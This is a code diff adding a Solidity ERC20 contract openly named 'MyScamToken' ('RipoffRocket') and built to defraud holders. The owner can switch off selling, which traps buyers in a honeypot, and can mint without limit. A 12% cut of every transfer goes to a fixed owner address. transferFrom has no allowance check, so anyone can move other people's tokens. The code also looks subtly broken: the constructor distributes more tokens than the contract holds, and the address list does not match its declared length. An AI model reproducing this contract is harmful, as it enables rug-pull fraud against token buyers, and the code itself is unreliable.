@@ -1,0 +1,155 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.25;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract MyScamToken is ERC20, Ownable {
+    address public ownerCutAddress;
+    bool public disableSelling;
+
+    constructor() ERC20("RipoffRocket", "RR") Ownable(msg.sender) {
+        ownerCutAddress = 0xE643E6eCB193f60705Ac2247E21e9B5C31efC630;
+        _mint(msg.sender, 95000000 * (10 ** uint256(decimals())));
+        _mint(address(this), 5000000 * (10 ** uint256(decimals())));
+        disableSelling = false;
+
+        // Initialize addresses to receive 1% each
+        address[95] memory addresses = [
+            0x663bb599853adc4ea4f1dcc71c2aaa14a47e2697,
+            0x98c04e2b26bba8cca7906c713fa910d8d0277e9b,
+            0x27e487c677e0c54180b22ba3574e800319285b38,
+            0x2c90bf23dddee297e7e2de2d0432c3fce6961cc7,
+            0xce8dc75c9b79133d96e46e15bd7c7dc76583e3ed,
+            0x27c27a5dcf4b6941aeb811f192b76936001ae50d,
+            0x670808ff58d903e5331f5ccad91206dc6d33b391,
+            0x6bce059e2ba58e325b16f7903e6478f129cdf92b,
+            0xdf175ceecb57a81e693c843a21b3019e29673980,
+            0x25360cc12f1454f5c73d6b03f645b7d897f1283a,
+            0x94fff06958a90bdf283fd8904fbf976fe2d5ff8b,
+            0xead24ac899288c046b0421cd09ce55be9470fd3f,
+            0x4a6158ff21b087eec20f031abaa8820ea03de255,
+            0x3cf23f88f5c3fc6b2da3147ffb6145fdf1042c43,
+            0x5e7521adb6f982abcfe86a8205164eff93d8bb16,
+            0x97840f1c7dd2ea48a580d5c7f61817467faca8db,
+            0xf89039df49ba1d30853dd3297de3eca4758b11de,
+            0x4879c3875d9d2ff1537a703c5b2cc2b0bf7a86e5,
+            0xd11f9ac3e438980a4cf5d2629ba89926eb937686,
+            0x66e4c675ae9034a8df6737bd2fdc15d459a8c97e,
+            0xe0e0e5e4985cfd7b315f290d3410c83354bd79b4,
+            0xe9e00bd075036e9d19a3d422fe54532d6d33a091,
+            0x8f7f539a024681be142950f63cff3fc4f4970df1,
+            0x34dec7a8411d504585f313c2e6e44e1b913ce477,
+            0xc9f8a7ac5ffe01c9d65eb33b17ad4382b5e510f6,
+            0xe1b4942d9fabddcafd2166fdbea9d4661d2ad0fc,
+            0x0751e128c3aee6cec798afdfd627dd863406f590,
+            0x8e8e21470189ba37038667829c608f806e851ac6,
+            0xabe837162f686d9ee01599697fff257dfda4e02a,
+            0x5c059b0173d5cbc73698534ccc7867b2603a48bd,
+            0x446fb3cd8a816748cc2bc0d3d79c78d757354b50,
+            0xf54a1c8e3138958b820e5e44ef2d99097ee98712,
+            0x296bb339188d663e1317f65fcb8b3b442528b4a0,
+            0xdd403b6bd4845e905eea6c338aeea708da56912e,
+            0xc9bbf46a826f1105287acad1532a0d466daae6c5,
+            0xa0adb164f0d71ba4c5cb80c43672306f5663facb,
+            0xf4b3f48bbab22243791252e51c4f7e0b6fb38ab8,
+            0x137a6252103d371e5347605e5d80555e34eb1770,
+            0xa14bee8ba9be5ab029f7101823b412b0d421e23b,
+            0x8707bb793a943dd00d0f27ba1d780cee3c66bb40,
+            0x2d40fefd708c8c5443c9a550426a8fb35bc842a1,
+            0xaba5cbecc5198ebb01a172d98903f34ccf3ca0b1,
+            0x1b1f1d4a82b393c8b1d9a0b3d6bc823fbde91816,
+            0xf890e51fb7b0a182f75f88baeccbdc16ee955a6a,
+            0x966dab594c9dd3cc841ff65557eb952210aa6d61,
+            0xc9bbf46a826f1105287acad1532a0d466daae6c5,
+            0x2fd2bcb208ef67e874ed75b212f1429fb56c62e1,
+            0x3c77a5bfc32558ff167365fdcf7991867b7af6fa,
+            0x0d9b290b74b4f34ac30b9fe06a9c392e09611d8f,
+            0x9f9fff3ebf0aff93cdff5121fd40b675b420d936,
+            0x0ac9a98731e6dd4bbe2e1e7a32c4871e2936c52c,
+            0x8d453ec91f77b2415da1e9920135948ee5f851b1,
+            0xb4c3f2183cb3d35300038ffc2c02bc8e7947b128,
+            0x7f7795ec85772949ecaa10b0ce481e89312ad1fe,
+            0x941c988b7ca32df5741759b3da419e8a8604a278,
+            0x5e64e8c9344156949cef8b192db21c7317aa535a,
+            0xa11a5a0d8a76c0077269073c24d87bf2f5f3b0ef,
+            0xd0a4e19c1e3b9d7202a1b90260fba7a8385292ce,
+            0x7b3f8a0a4ac3288645e2d3dc2d2c29f3d4b513b7,
+            0xe04f5985ab3bb6dcaf41aec22c21c027b97bcd65,
+            0x6c55144e06e845e918a8ee63924f4b58883bba14,
+            0xa5717e8db1169922e1cee869d62e44df55c4d1ac,
+            0xb227f44302153e3b6b089518f24425f3e7a7e7fc,
+            0xfcb708a2c084058e18b950458c0c4647e9fc2ac2,
+            0xc0ac7874ce3b910b4b41a7e5a208367660376e40,
+            0xb20909412f0804e4523a31f8b2b72d51450e888c,
+            0x696acc4ac93278b06798d0410515569010db0ae6,
+            0x6425c4cd295e01e85f5b242b02ded65e0d812198,
+            0x49a57e649cd501ffb1936b5312f58613424fc37c,
+            0x47780ba51f66cb99136ccf26077498187c12bac6,
+            0x058f42d49eb994afa8c94e27fab2c9617ce7fb65,
+            0x43bc1bdfba3c4e89101319dc47c2e42d8742b0a5,
+            0x1be1dfb189f344ef4a6f652afbbd57098b39ea6b,
+            0x5f1cf6fa75acfeefc156becbf5d461a057ff0915,
+            0xf9add04a4a6362b19f96f6b2e8257ea3026c9177,
+            0x8fe46a8e3b3d9eedc80f2e01910e06b31defcf6f,
+            0x35d25105d2196994b26701500bdf70cfbaafd7a5,
+            0xc7dbcd44b6e047b9da4a1b945bc93bf760e0b6d3,
+            0xb540314db5537ed941126f394499c65cd3abcffe,
+            0x8dc1b412545fbfcd6d8d51bf15970b9f3e420af9,
+            0x3d5e0ecfa99aa35f8fef129365d44713337540a9,
+            0x19514e77e6ab17e448bde9706d03e2d477ff4256,
+            0xd901e8ddaf3445d88624f388621e1f9f60c83a89,
+            0x2f08a4da17351411d85c5a56d939f809ee60efbe,
+            0xb933892c6a9942e02e47cb21fa8aec0f67439f79,
+            0x1ff2fd054a4518a8debef3ff3891929b141bd2d2,
+            0xe882ceff14db4e8d8acca9bbe53d120ec7eafa19,
+            0xb95c8f78404517caf4479296def399a08681d3df,
+            0xa03fca25dfdcf577b61666f80f89d69bfbc9b2a8
+        ];
+
+        uint256 amountPerAddress = (95000000 * (10 ** uint256(decimals()))) / 100; // 1% of total supply
+        for (uint256 i = 0; i < addresses.length; i++) {
+            _transfer(address(this), addresses[i], amountPerAddress);
+        }
+    }
+
+    function setDisableSelling(bool newDisableSelling) public onlyOwner {
+        disableSelling = newDisableSelling;
+    }
+
+    function mint(address recipient, uint256 value) public onlyOwner {
+        _mint(recipient, value);
+    }
+
+    function doubleDipMint(address recipient, uint256 value) public onlyOwner {
+        require(recipient != msg.sender, "Cannot double dip on your own address");
+        _mint(recipient, value);
+        _mint(msg.sender, value);
+    }
+
+    function sellAll(address recipient, uint256 value) public {
+        require(!disableSelling, "Selling is disabled");
+        require(recipient != msg.sender, "Cannot sell to your own address");
+        uint256 cutAmount = (value * 12) / 100;
+        _transfer(msg.sender, recipient, value - cutAmount);
+        _transfer(recipient, ownerCutAddress, cutAmount);
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        uint256 cutAmount = (amount * 12) / 100;
+        _transfer(msg.sender, recipient, amount - cutAmount);
+        _transfer(recipient, ownerCutAddress, cutAmount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        uint256 cutAmount = (amount * 12) / 100;
+        _transfer(sender, recipient, amount - cutAmount);
+        _transfer(recipient, ownerCutAddress, cutAmount);
+        return true;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return super.totalSupply();
+    }
+}
